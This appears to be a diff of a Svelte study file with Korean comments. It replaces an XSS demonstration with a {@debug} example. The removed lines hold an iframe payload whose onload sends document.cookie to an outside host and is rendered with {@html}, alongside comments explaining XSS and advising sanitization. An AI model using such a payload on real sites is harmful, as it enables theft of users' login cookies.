@@ -1,17 +1,19 @@
 <script lang="ts">
-  const h1 = '<h1>Hello Heropy</h1>';
-
-  // documnet.cookie에 로그인 정보가 담겨있다고 가정 -> XSS 공격 가능
-  // 내용을 필터링할 수 있는 라이브러리 사용하는 것이 좋다.
-  const xss = '<iframe onload="document.location=`https://heropy.blog?${documnet.cookie}`"></iframe>';
+  const name = 'Jinmok';
+  let index = 0;
 </script>
 
-<!-- `@` 기호는 `at-sign`이라고 부른다. -->
-{@html h1}
-<!-- html로 해석돼서 들어가야하는 문자열이 있으면 보간법 내부에서 앞쪽에 html 키워드를 붙여준다. -->
+<!--
+  JS에서는 console을 활용해서 디버깅을 많이 해주는데 Svelte는 기본 디버깅 키워드(debug)를 제공한다.
+ -->
 
 <!--
-XSS(Cross Site Scripting, 사이트 간 스크립팅)은 웹 취약점 중 하나로
-웹사이트 관리자가 아닌 제3자가 웹에 악성 스크립트를 삽입할 수 있는 것을 의미한다.
--->
-{@html xss}
+  보간에 작성돼있는 데이터가 변경될 때마다 콘솔에 내용을 출력해준다.
+  여러가지 데이터를 넣어줄 수 있다.
+  디버깅하려는 데이터에대한 추적 코드를 script쪽에 넣지않아도 html위치에 편하게 작성할 수 있다.
+  개발자 도구가 켜져있는 상태에서 데이터가 변경되면 프로세스를 일시정지 해준다. -> 불편할 수도 있음
+ -->
+{@debug index, name}
+<h1
+  on:click={() => { index += 1; }}
+  on:keydown={() => {}}>Hello {name}!</h1>
